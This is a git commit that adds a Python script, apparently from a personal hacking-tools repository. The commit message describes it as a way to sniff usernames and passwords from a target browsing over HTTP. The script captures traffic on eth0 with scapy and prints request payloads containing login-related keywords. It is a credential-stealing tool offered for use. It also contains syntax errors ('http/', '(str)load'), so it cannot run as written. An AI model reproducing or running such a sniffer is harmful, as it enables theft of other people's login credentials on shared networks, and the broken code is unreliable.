1a0e38b2fc8a9a20ce30760fb6aacbccf0960483
Adam Beardsley <a.beardsley79@gmail.com>
2021-08-23 14:23:32 +0100

    HTTP_pass_sniff.py: script to sniff username and password from target conneting to web page using HTTP

---
+++ sniffers_flooders_spoofers/HTTP_pass_sniff.py
@@ -0,0 +1,31 @@
+'''
+Created on 23 Aug 2021
+
+@author: adam
+'''
+#!/usr/bin/python3
+
+#pip install scapy and scapy_http befor running this script if note aready installed
+
+import scapy.all as scapy
+from scapy_http import http/
+
+def sniff(interface):
+    scapy.sniff(iface=interface, store=False, prn=process_packets)
+    
+def process_packets(packet):
+    if packet.haslayer(http.HTTPRequest):
+        url = packet[http.HTTPRequest].HOST + packet[http.HTTPRequest].Path
+        print(url)
+        if packet.haslayer(scapy.Raw):
+            load = packet[scapy.Raw].load
+            for i in words:
+                if i in (str)load:
+                    print(load)
+                    break
+            
+        
+
+words = ["Password","password", "User", "user", "Username", "username", "login", "pass"]
+
+sniff("eth0")
